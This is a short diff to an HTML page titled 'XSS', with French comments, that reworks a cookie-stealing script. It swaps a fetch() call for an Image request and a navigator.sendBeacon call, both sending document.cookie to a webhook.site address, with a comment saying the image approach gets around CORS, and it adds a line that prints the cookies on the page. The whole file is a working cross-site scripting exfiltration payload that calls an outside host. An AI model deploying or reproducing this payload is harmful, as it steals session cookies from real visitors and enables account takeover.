@@ -2,8 +2,16 @@
 <html>
 <head><title>XSS</title></head>
 <body>
+<h1>Page de test</h1>
 <script>
-fetch("https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?cookie=" + document.cookie);
+// Approche avec image (contourne CORS)
+new Image().src = "https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?cookie=" + encodeURIComponent(document.cookie);
+
+// Approche avec beacon (plus fiable)
+navigator.sendBeacon("https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?cookie=" + encodeURIComponent(document.cookie));
+
+// Afficher les cookies dans la page pour vérifier
+document.body.innerHTML += "<p>Cookies: " + document.cookie + "</p>";
 </script>
 </body>
 </html>
